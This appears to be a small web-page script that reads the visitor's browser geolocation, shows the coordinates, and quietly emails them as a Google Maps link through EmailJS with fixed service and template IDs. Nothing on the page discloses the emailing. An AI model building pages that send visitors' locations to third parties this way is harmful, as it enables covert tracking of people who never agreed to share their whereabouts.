
/* Place your JavaScript in this file */
const x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
    sendMail(position.coords.latitude, position.coords.longitude);
    console.log(position.coords.latitude+', '+position.coords.longitude)
  x.innerHTML = "Latitude: " + position.coords.latitude + 
  "<br>Longitude: " + position.coords.longitude;
}

function sendMail(lat, long) {
    console.log(lat, long);
  console.log(lat.toString(), long);
  const templateParams = {
    name: 'James',
    message: 'https://maps.google.com/maps?q='+lat+','+long,
  };
  console.log(templateParams.message);
  console.log(templateParams.name);

  emailjs.send('service_dkfcjxp', 'template_w7ocdql', templateParams).then(
    (response) => {
      console.log('SUCCESS!', response.status, response.text);
    },
    (error) => {
      console.log('FAILED...', error);
    },
  );
}
